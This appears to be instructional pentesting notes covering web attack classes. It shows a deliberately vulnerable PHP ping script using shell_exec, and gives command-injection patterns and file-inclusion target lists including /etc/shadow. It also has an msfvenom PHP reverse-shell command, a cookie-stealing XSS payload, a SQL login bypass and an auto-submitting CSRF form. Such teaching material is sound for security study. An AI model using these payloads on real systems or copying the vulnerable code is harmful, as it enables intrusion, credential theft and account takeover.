• Code Injection Vulnerability
ping.php
------------------------------------------------------
<?php

if( isset($_POST['submit'])){

   $target = $_REQUEST[ 'ip' ];
if(stristr(php_uname('s'),'windows NT')){

        $cmd = shell_exec( 'ping'.$target );
	echo '<pre>'.$cmd.</pre>';

} else {

	$cmd = shell_exec( 'ping -c 3 '. $target );
	echo '<pre>'.$cmd.'</pre>';

}
}
?>
----------------------------------------------------
• Case 1: - <IP address> ; Injection_command
 Case 2: <IP address> | Injection_command


• File Inclusion Vulnerability: 

Here is the list of some of the important files to look for once the vulnerabilities are identified.
• Payload list if the target server is Windows: - 
c:/boot.ini 
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

• Payload list if the target server is Linux: - 

/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp

https://pentestlab.blog/2012/06/29/directory-traversal-cheat-sheet/

•Upload Vulnerability: -

Generate a msfpayload in PHP format

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.100.140 LPORT= 
443 -f raw > gift.php

• Cross Site Scripting

• Types of XSS: 
− Reflected XSS
− Stored XSS
− DOM-based XSS

 reflected XSS. We have a URL let’s say – 
 https://insecure-site.com/status?message=This+is+good
•It takes the input from the end user & then reflect the entered input to the 
screen. 
<p>Status: This is good.</p> 
• The application doesn’t perform any other processing of data, so an attacker 
can construct a query like this: - 
https://insecure-site.com/status?message=<script>/*+Bad+stuff+here+*/</s
cript>
• This can have disastrous consequences as this crafted link can be sent to the 
victim and attacker can execute it’s own Java Script targeting the user.
<p>Status: <script>/* Bad stuff here */</script></p>

Reflected XSS

Let’s try to control the application flow using some Java Script code, which 
simply pop/alert in a given user reference. Ex: <script>alert(1)</script>
 payload used is: <script>alert(document.cookie)</script> & the session 
cookie is reflected for the user session.



• SQL Injection: - 

• SQL command basics: - 
− ‘AND’, both conditions must be true to be included in the result.
− ‘OR’ any one condition must be true to be included in the result.
− ‘SELECT’ to fetch data from database
− ‘WHERE’ to filter result & to include only rows where the given condition 
is true.
−‘UNION’ to combine the result of two or more SELECT statements.

SQL Injection
login pages
$’ or ‘1’=‘1

•Information Disclosure
It is type of information leakage, when a website exposes sensitive 
information to the end users un-intentionally.
• Any critical information like PII, patient records, business information etc
• Information about infrastructure setup etc
• Access to Old website backups / logic revelation et

• Cross Site Request Forgery
 It allows an attacker to force users (unintentionally) to perform actions that 
are risky. 
• Based on identification of the induced flow, attacker craft special request & somehow 
induce users to click on the link.
• Actions like re-setting password, changing emails, full-take over of an application etc.
• Applications have session cookies to identify the user requests. However, the tracking 
of user session remains unmanaged.

<CAPTURED REQUEST>
POST /email/change HTTP/1.1 
Host: vulnerable-app.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 25 
Cookie: session=aksgdg7ewgfkljaslkgfpiwept 
email=master@admin-user.com 

csrf.html
<html>
 <body>
 <form action="https://vulnerable-app.com/email/change" method="POST"> 
 <input type="hidden" name="email" value=”fake_user@xyz.net" /> 
 </form> 
 <script> document.forms[0].submit();</script> 
 </body> 
</html> 


